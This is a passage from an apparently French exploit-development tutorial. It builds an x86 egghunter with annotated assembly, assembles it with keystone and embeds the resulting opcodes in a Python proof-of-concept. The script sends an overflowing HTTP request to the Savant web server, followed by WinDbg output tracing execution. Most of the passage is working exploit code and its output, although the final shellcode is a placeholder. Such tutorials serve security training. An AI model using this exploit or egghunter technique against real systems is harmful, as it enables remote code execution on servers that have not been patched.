<a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a>    <span class="c1"># Mets à jour le registre `ZF` en fonction du résultat de la comparaison</span>
<a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a>    <span class="c1"># Incrémenter automatiquement `EDI` de 1 DWORD</span>
<a id="__codelineno-45-12" name="__codelineno-45-12" href="#__codelineno-45-12"></a><span class="s2">&quot;  scasd    ;&quot;</span> 
<a id="__codelineno-45-13" name="__codelineno-45-13" href="#__codelineno-45-13"></a>  <span class="c1"># Jump conditionnel dépendant du résultat de la comparaison via `scasd`</span>
<a id="__codelineno-45-14" name="__codelineno-45-14" href="#__codelineno-45-14"></a>    <span class="c1"># Si le 1er DWORD du *egg* n&#39;est pas trouvé on jump a `loop_inc_one` pour repeter le processus de recherche en incrémentant l&#39;adresse mémoire de un</span>
<a id="__codelineno-45-15" name="__codelineno-45-15" href="#__codelineno-45-15"></a>    <span class="c1"># Si le 1er DWORD est trouve on va réutiliser SCASD pour chercher le deuxième DWORD de notre egg</span>
<a id="__codelineno-45-16" name="__codelineno-45-16" href="#__codelineno-45-16"></a><span class="s2">&quot;  jnz loop_inc_one ;&quot;</span> 
</code></pre></div>
<p>On arrive ici si on a trouvé le premier DWORD de notre <em>egg</em> et qu'on cherche le deuxième :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>  <span class="c1"># Compare de nouveau `EAX` mais avec le 2em DWORD de `EDI` (à la suite de l&#39;incrémentation du premier `SCASD`)</span>
<a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="s2">&quot;  scasd    ;&quot;</span> 
<a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>  <span class="c1"># Jump conditionnel dépendant du résultat de la comparaison via `scasd`</span>
<a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>    <span class="c1"># Si le 2em DWORD du *egg* n&#39;est pas trouvé on jump a `loop_inc_one` pour répéter le processus</span>
<a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a>    <span class="c1"># Si le 2em DWORD est trouve on continue</span>
<a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a><span class="s2">&quot;  jnz loop_inc_one ;&quot;</span> 
<a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a><span class="c1">#</span>
<a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a><span class="c1">#</span>
<a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a><span class="s2">&quot; matched:     &quot;</span>
<a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a>  <span class="c1"># On jump sur `EDI` qui contient donc l&#39;*egg* puisque les 2 DWORD sont présents</span>
<a id="__codelineno-46-11" name="__codelineno-46-11" href="#__codelineno-46-11"></a><span class="s2">&quot;  jmp edi    ;&quot;</span> 
</code></pre></div>
<p>Code complet :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">keystone</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>
<a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="n">CODE</span> <span class="o">=</span> <span class="p">(</span>
<a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a><span class="c1">#</span>
<a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a><span class="c1">#</span>
<a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a><span class="s2">&quot; loop_inc_page:    &quot;</span>
<a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a>  <span class="c1"># Operation `OR` sur le registre `DX` (`EDX`)</span>
<a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a>  <span class="c1"># Va faire pointer `EDX` sur la dernière adresse de la page mémoire</span>
<a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a><span class="s2">&quot;  or dx, 0x0fff  ;&quot;</span> 
<a id="__codelineno-47-10" name="__codelineno-47-10" href="#__codelineno-47-10"></a><span class="c1">#</span>
<a id="__codelineno-47-11" name="__codelineno-47-11" href="#__codelineno-47-11"></a><span class="c1">#</span>
<a id="__codelineno-47-12" name="__codelineno-47-12" href="#__codelineno-47-12"></a><span class="s2">&quot; loop_inc_one:    &quot;</span>
<a id="__codelineno-47-13" name="__codelineno-47-13" href="#__codelineno-47-13"></a>  <span class="c1"># Operation `INC` sur le registre `EDX`</span>
<a id="__codelineno-47-14" name="__codelineno-47-14" href="#__codelineno-47-14"></a>  <span class="c1"># Incrémenter `EDX` de `1` pour pointer sur une nouvelle page mémoire</span>
<a id="__codelineno-47-15" name="__codelineno-47-15" href="#__codelineno-47-15"></a><span class="s2">&quot;  inc edx    ;&quot;</span>  
<a id="__codelineno-47-16" name="__codelineno-47-16" href="#__codelineno-47-16"></a><span class="c1">#</span>
<a id="__codelineno-47-17" name="__codelineno-47-17" href="#__codelineno-47-17"></a><span class="c1">#</span>
<a id="__codelineno-47-18" name="__codelineno-47-18" href="#__codelineno-47-18"></a><span class="s2">&quot; loop_check:     &quot;</span>
<a id="__codelineno-47-19" name="__codelineno-47-19" href="#__codelineno-47-19"></a>  <span class="c1"># On positionne le contenu du registre `EDX` sur la pile</span>
<a id="__codelineno-47-20" name="__codelineno-47-20" href="#__codelineno-47-20"></a>  <span class="c1"># Non nécessaire, mais permet d&#39;assurer une sauvegarde, car on ne peut pas garantir que EDX sera restauré a la suite de l&#39;appel système</span>
<a id="__codelineno-47-21" name="__codelineno-47-21" href="#__codelineno-47-21"></a><span class="s2">&quot;  push edx   ;&quot;</span>
<a id="__codelineno-47-22" name="__codelineno-47-22" href="#__codelineno-47-22"></a>  <span class="c1"># On positionne `0x2` sur la pile. 0x2 est le numéro de l&#39;appel système NtAccessCheckAndAuditAlarm</span>
<a id="__codelineno-47-23" name="__codelineno-47-23" href="#__codelineno-47-23"></a><span class="s2">&quot;  push 0x2    ;&quot;</span> 
<a id="__codelineno-47-24" name="__codelineno-47-24" href="#__codelineno-47-24"></a>  <span class="c1"># On positionne le dernier élément de la pile (`pop`) qui est donc `0x2` qu&#39;on vient de mettre dans la pile dans le registre `EAX`</span>
<a id="__codelineno-47-25" name="__codelineno-47-25" href="#__codelineno-47-25"></a>  <span class="c1"># Le numéro de l&#39;appel système est dans `EAX`</span>
<a id="__codelineno-47-26" name="__codelineno-47-26" href="#__codelineno-47-26"></a><span class="s2">&quot;  pop eax    ;&quot;</span> 
<a id="__codelineno-47-27" name="__codelineno-47-27" href="#__codelineno-47-27"></a>  <span class="c1"># Le numéro de l&#39;appel système est dans `EAX` et `EDX` contient un faux pointeur</span>
<a id="__codelineno-47-28" name="__codelineno-47-28" href="#__codelineno-47-28"></a>  <span class="c1"># On invoque l&#39;appel système va `INT`</span>
<a id="__codelineno-47-29" name="__codelineno-47-29" href="#__codelineno-47-29"></a><span class="s2">&quot;  int 0x2e   ;&quot;</span> 
<a id="__codelineno-47-30" name="__codelineno-47-30" href="#__codelineno-47-30"></a>  <span class="c1"># On compare `AL` (registre du bas de `EAX`) avec `05` pour éviter le *null bytes*</span>
<a id="__codelineno-47-31" name="__codelineno-47-31" href="#__codelineno-47-31"></a><span class="s2">&quot;  cmp al,05   ;&quot;</span> 
<a id="__codelineno-47-32" name="__codelineno-47-32" href="#__codelineno-47-32"></a>  <span class="c1"># On restaure l&#39;adresse mémoire depuis la pile dans `EDX`</span>
<a id="__codelineno-47-33" name="__codelineno-47-33" href="#__codelineno-47-33"></a><span class="s2">&quot;  pop edx    ;&quot;</span> 
<a id="__codelineno-47-34" name="__codelineno-47-34" href="#__codelineno-47-34"></a><span class="c1">#</span>
<a id="__codelineno-47-35" name="__codelineno-47-35" href="#__codelineno-47-35"></a><span class="c1">#</span>
<a id="__codelineno-47-36" name="__codelineno-47-36" href="#__codelineno-47-36"></a><span class="s2">&quot; loop_check_valid:   &quot;</span>
<a id="__codelineno-47-37" name="__codelineno-47-37" href="#__codelineno-47-37"></a>  <span class="c1"># Jump conditionnel qui va se baser sur le résultat de l&#39;opération `CMP`</span>
<a id="__codelineno-47-38" name="__codelineno-47-38" href="#__codelineno-47-38"></a>    <span class="c1"># Si un `STATUS_ACCESS_VIOLATION` a été trouvé, on se déplace à la prochaine page mémoire en faisant un jump vers le début de notre script pour refaire les étapes précédentes</span>
<a id="__codelineno-47-39" name="__codelineno-47-39" href="#__codelineno-47-39"></a>    <span class="c1"># Si la mémoire est mappée ou qu&#39;on a accès on continue pour aller vérifier notre signature unique (*egg*)</span>
<a id="__codelineno-47-40" name="__codelineno-47-40" href="#__codelineno-47-40"></a><span class="s2">&quot;  je loop_inc_page ;&quot;</span>
<a id="__codelineno-47-41" name="__codelineno-47-41" href="#__codelineno-47-41"></a><span class="c1">#</span>
<a id="__codelineno-47-42" name="__codelineno-47-42" href="#__codelineno-47-42"></a><span class="c1">#</span>
<a id="__codelineno-47-43" name="__codelineno-47-43" href="#__codelineno-47-43"></a><span class="s2">&quot; is_egg:      &quot;</span>
<a id="__codelineno-47-44" name="__codelineno-47-44" href="#__codelineno-47-44"></a>  <span class="c1"># On place note *egg* (ici `w00t` mais ça pourrait être autre chose) dans le registre `EAX`</span>
<a id="__codelineno-47-45" name="__codelineno-47-45" href="#__codelineno-47-45"></a><span class="s2">&quot;  mov eax, 0x74303077 ;&quot;</span> 
<a id="__codelineno-47-46" name="__codelineno-47-46" href="#__codelineno-47-46"></a>  <span class="c1"># On copie l&#39;adresse présente dans `EDX` dans `EDI`</span>
<a id="__codelineno-47-47" name="__codelineno-47-47" href="#__codelineno-47-47"></a><span class="s2">&quot;  mov edi, edx  ;&quot;</span> 
<a id="__codelineno-47-48" name="__codelineno-47-48" href="#__codelineno-47-48"></a>  <span class="c1"># Compare la valeur stockée dans `EAX` avec le 1er DWORD de l&#39;adresse mémoire sur laquelle pointe `EDI` (qui contient maintenant l&#39;adresse stockée dans `EDX` à laquelle l&#39;appel système a pu accéder)</span>
<a id="__codelineno-47-49" name="__codelineno-47-49" href="#__codelineno-47-49"></a>  <span class="c1"># On vérifie ainsi si l&#39;adresse mappée identifiée via l&#39;appel système contient l&#39;*egg* ou pas</span>
<a id="__codelineno-47-50" name="__codelineno-47-50" href="#__codelineno-47-50"></a>    <span class="c1"># Mets à jour le registre `ZF` en fonction du résultat de la comparaison</span>
<a id="__codelineno-47-51" name="__codelineno-47-51" href="#__codelineno-47-51"></a>    <span class="c1"># Incrémenter automatiquement `EDI` de 1 DWORD</span>
<a id="__codelineno-47-52" name="__codelineno-47-52" href="#__codelineno-47-52"></a><span class="s2">&quot;  scasd    ;&quot;</span> 
<a id="__codelineno-47-53" name="__codelineno-47-53" href="#__codelineno-47-53"></a>  <span class="c1"># Jump conditionnel dépendant du résultat de la comparaison via `scasd`</span>
<a id="__codelineno-47-54" name="__codelineno-47-54" href="#__codelineno-47-54"></a>    <span class="c1"># Si le 1er DWORD du *egg* n&#39;est pas trouvé on jump a `loop_inc_one` pour repeter le processus de recherche en incrémentant l&#39;adresse mémoire de un</span>
<a id="__codelineno-47-55" name="__codelineno-47-55" href="#__codelineno-47-55"></a>    <span class="c1"># Si le 1er DWORD est trouve on va réutiliser SCASD pour chercher le deuxième DWORD de notre egg</span>
<a id="__codelineno-47-56" name="__codelineno-47-56" href="#__codelineno-47-56"></a><span class="s2">&quot;  jnz loop_inc_one ;&quot;</span> 
<a id="__codelineno-47-57" name="__codelineno-47-57" href="#__codelineno-47-57"></a>  <span class="c1"># Compare de nouveau `EAX` mais avec le 2em DWORD de `EDI` (à la suite de l&#39;incrémentation du premier `SCASD`)</span>
<a id="__codelineno-47-58" name="__codelineno-47-58" href="#__codelineno-47-58"></a><span class="s2">&quot;  scasd    ;&quot;</span> 
<a id="__codelineno-47-59" name="__codelineno-47-59" href="#__codelineno-47-59"></a>  <span class="c1"># Jump conditionnel dépendant du résultat de la comparaison via `scasd`</span>
<a id="__codelineno-47-60" name="__codelineno-47-60" href="#__codelineno-47-60"></a>    <span class="c1"># Si le 2em DWORD du *egg* n&#39;est pas trouvé on jump a `loop_inc_one` pour répéter le processus</span>
<a id="__codelineno-47-61" name="__codelineno-47-61" href="#__codelineno-47-61"></a>    <span class="c1"># Si le 2em DWORD est trouve on continue</span>
<a id="__codelineno-47-62" name="__codelineno-47-62" href="#__codelineno-47-62"></a><span class="s2">&quot;  jnz loop_inc_one ;&quot;</span> 
<a id="__codelineno-47-63" name="__codelineno-47-63" href="#__codelineno-47-63"></a><span class="c1">#</span>
<a id="__codelineno-47-64" name="__codelineno-47-64" href="#__codelineno-47-64"></a><span class="c1">#</span>
<a id="__codelineno-47-65" name="__codelineno-47-65" href="#__codelineno-47-65"></a><span class="s2">&quot; matched:     &quot;</span>
<a id="__codelineno-47-66" name="__codelineno-47-66" href="#__codelineno-47-66"></a>  <span class="c1"># On jump sur `EDI` qui contient donc l&#39;*egg* puisque les 2 DWORD sont présents</span>
<a id="__codelineno-47-67" name="__codelineno-47-67" href="#__codelineno-47-67"></a><span class="s2">&quot;  jmp edi    ;&quot;</span>   
<a id="__codelineno-47-68" name="__codelineno-47-68" href="#__codelineno-47-68"></a><span class="p">)</span>
<a id="__codelineno-47-69" name="__codelineno-47-69" href="#__codelineno-47-69"></a>
<a id="__codelineno-47-70" name="__codelineno-47-70" href="#__codelineno-47-70"></a><span class="c1"># Initialize engine in 32bit mode</span>
<a id="__codelineno-47-71" name="__codelineno-47-71" href="#__codelineno-47-71"></a><span class="n">ks</span> <span class="o">=</span> <span class="n">Ks</span><span class="p">(</span><span class="n">KS_ARCH_X86</span><span class="p">,</span> <span class="n">KS_MODE_32</span><span class="p">)</span>
<a id="__codelineno-47-72" name="__codelineno-47-72" href="#__codelineno-47-72"></a><span class="n">encoding</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="n">ks</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="n">CODE</span><span class="p">)</span>
<a id="__codelineno-47-73" name="__codelineno-47-73" href="#__codelineno-47-73"></a><span class="n">egghunter</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
<a id="__codelineno-47-74" name="__codelineno-47-74" href="#__codelineno-47-74"></a><span class="k">for</span> <span class="n">dec</span> <span class="ow">in</span> <span class="n">encoding</span><span class="p">:</span> 
<a id="__codelineno-47-75" name="__codelineno-47-75" href="#__codelineno-47-75"></a>  <span class="n">egghunter</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">x</span><span class="si">{0:02x}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">dec</span><span class="p">))</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-47-76" name="__codelineno-47-76" href="#__codelineno-47-76"></a>
<a id="__codelineno-47-77" name="__codelineno-47-77" href="#__codelineno-47-77"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;egghunter = (</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">egghunter</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">)</span>
</code></pre></div>
<p>Exécution du script complet et génération des <em>opcodes</em> correspondants :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="err">$</span> <span class="n">python3</span> <span class="n">egghunter</span><span class="o">.</span><span class="n">py</span>
<a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="n">egghunter</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre></div>
<p>Mise à jour de la preuve de concept en intégrant les <em>opcodes</em> générés :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a>
<a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">253</span>
<a id="__codelineno-49-10" name="__codelineno-49-10" href="#__codelineno-49-10"></a>
<a id="__codelineno-49-11" name="__codelineno-49-11" href="#__codelineno-49-11"></a>  <span class="n">httpMethod</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x31\xC9\x85\xC9\x0F\x84\x11</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot; /&quot;</span> <span class="c1"># XOR ECX ECX; TEST ECX ECX; JE 0x17</span>
<a id="__codelineno-49-12" name="__codelineno-49-12" href="#__codelineno-49-12"></a>
<a id="__codelineno-49-13" name="__codelineno-49-13" href="#__codelineno-49-13"></a>  <span class="n">egghunter</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s2">&quot;</span>  <span class="c1"># NOP sled</span>
<a id="__codelineno-49-14" name="__codelineno-49-14" href="#__codelineno-49-14"></a>               <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x66\x81\xca\xff\x0f\x42\x52\x6a</span><span class="s2">&quot;</span>
<a id="__codelineno-49-15" name="__codelineno-49-15" href="#__codelineno-49-15"></a>               <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x02\x58\xcd\x2e\x3c\x05\x5a\x74</span><span class="s2">&quot;</span>
<a id="__codelineno-49-16" name="__codelineno-49-16" href="#__codelineno-49-16"></a>               <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xef\xb8\x77\x30\x30\x74\x89\xd7</span><span class="s2">&quot;</span>
<a id="__codelineno-49-17" name="__codelineno-49-17" href="#__codelineno-49-17"></a>               <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xaf\x75\xea\xaf\x75\xe7\xff\xe7</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-49-18" name="__codelineno-49-18" href="#__codelineno-49-18"></a>
<a id="__codelineno-49-19" name="__codelineno-49-19" href="#__codelineno-49-19"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">egghunter</span><span class="p">))</span>
<a id="__codelineno-49-20" name="__codelineno-49-20" href="#__codelineno-49-20"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mh">0x418674</span><span class="p">))</span> <span class="c1"># 0x00418674 : POP EAX ; RET</span>
<a id="__codelineno-49-21" name="__codelineno-49-21" href="#__codelineno-49-21"></a>  <span class="n">httpEndRequest</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
<a id="__codelineno-49-22" name="__codelineno-49-22" href="#__codelineno-49-22"></a>
<a id="__codelineno-49-23" name="__codelineno-49-23" href="#__codelineno-49-23"></a>  <span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;w00tw00t&quot;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x44</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">400</span>
<a id="__codelineno-49-24" name="__codelineno-49-24" href="#__codelineno-49-24"></a>
<a id="__codelineno-49-25" name="__codelineno-49-25" href="#__codelineno-49-25"></a>  <span class="n">buf</span> <span class="o">=</span> <span class="n">httpMethod</span> <span class="o">+</span> <span class="n">egghunter</span> <span class="o">+</span> <span class="n">inputBuffer</span> <span class="o">+</span>  <span class="n">httpEndRequest</span> <span class="o">+</span> <span class="n">shellcode</span>
<a id="__codelineno-49-26" name="__codelineno-49-26" href="#__codelineno-49-26"></a>
<a id="__codelineno-49-27" name="__codelineno-49-27" href="#__codelineno-49-27"></a>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Sending buffer...&quot;</span><span class="p">)</span>
<a id="__codelineno-49-28" name="__codelineno-49-28" href="#__codelineno-49-28"></a>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<a id="__codelineno-49-29" name="__codelineno-49-29" href="#__codelineno-49-29"></a>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">server</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<a id="__codelineno-49-30" name="__codelineno-49-30" href="#__codelineno-49-30"></a>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<a id="__codelineno-49-31" name="__codelineno-49-31" href="#__codelineno-49-31"></a>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<a id="__codelineno-49-32" name="__codelineno-49-32" href="#__codelineno-49-32"></a>
<a id="__codelineno-49-33" name="__codelineno-49-33" href="#__codelineno-49-33"></a>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Done!&quot;</span><span class="p">)</span>
<a id="__codelineno-49-34" name="__codelineno-49-34" href="#__codelineno-49-34"></a>
<a id="__codelineno-49-35" name="__codelineno-49-35" href="#__codelineno-49-35"></a><span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">:</span>
<a id="__codelineno-49-36" name="__codelineno-49-36" href="#__codelineno-49-36"></a>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Could not connect!&quot;</span><span class="p">)</span>
</code></pre></div>
<p>On positionne un point d'arrêt sur l'adresse ou se trouve l'instruction <code>POP EAX;RET</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">bp</span> <span class="n">0x00418674</span>
<a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="p">***</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">verify</span> <span class="n">checksum</span> <span class="k">for</span> <span class="n">C</span><span class="p">:\</span><span class="n">Savant</span><span class="p">\</span><span class="n">Savant</span><span class="p">.</span><span class="n">exe</span>
</code></pre></div>
<p>On exécute le nouvel exploit et le point d'arrêt est atteint :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a><span class="n">Breakpoint</span> <span class="n">0</span> <span class="n">hit</span>
<a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">018d5778</span> <span class="n">ecx</span><span class="p">=</span><span class="n">0000000e</span> <span class="n">edx</span><span class="p">=</span><span class="n">77841670</span> <span class="n">esi</span><span class="p">=</span><span class="n">018d5778</span> <span class="n">edi</span><span class="p">=</span><span class="n">0041703c</span>
<a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a><span class="n">eip</span><span class="p">=</span><span class="n">00418674</span> <span class="n">esp</span><span class="p">=</span><span class="n">0460ea2c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">41414141</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000206</span>
<a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a><span class="n">Savant</span><span class="p">+</span><span class="n">0x18674</span><span class="p">:</span>
<a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a><span class="n">00418674</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
</code></pre></div>
<p>On procède à l'exécution jusqu'à ce qu'un embranchement soit rencontré avec <code>ph</code>.</p>
<p><em>The ph command executes the program until any kind of branching instruction is reached, including conditional or unconditional branches, calls, returns, and system calls.</em></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">ph</span>
<a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="n">eax</span><span class="p">=</span><span class="n">0460fe70</span> <span class="n">ebx</span><span class="p">=</span><span class="n">018d5778</span> <span class="n">ecx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edx</span><span class="p">=</span><span class="n">77841670</span> <span class="n">esi</span><span class="p">=</span><span class="n">018d5778</span> <span class="n">edi</span><span class="p">=</span><span class="n">0041703c</span>
<a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="n">eip</span><span class="p">=</span><span class="n">0460ea88</span> <span class="n">esp</span><span class="p">=</span><span class="n">0460ea34</span> <span class="n">ebp</span><span class="p">=</span><span class="n">41414141</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="n">0460ea88</span> <span class="n">0f8411000000</span>    <span class="n">je</span>      <span class="n">0460ea9f</span>                                <span class="p">[</span><span class="n">br</span><span class="p">=</span><span class="n">1</span><span class="p">]</span>
<a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a><span class="c">#</span>
<a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a><span class="c"># On décompile les opcodes à l&#39;adresse `0460ea9f`. On retrouve bien les NOP + le code ASM pour le egghunter</span>
<a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">u</span> <span class="n">0460ea9f</span> <span class="n">L16</span>
<a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a><span class="n">0460ea9f</span> <span class="n">90</span>              <span class="n">nop</span>
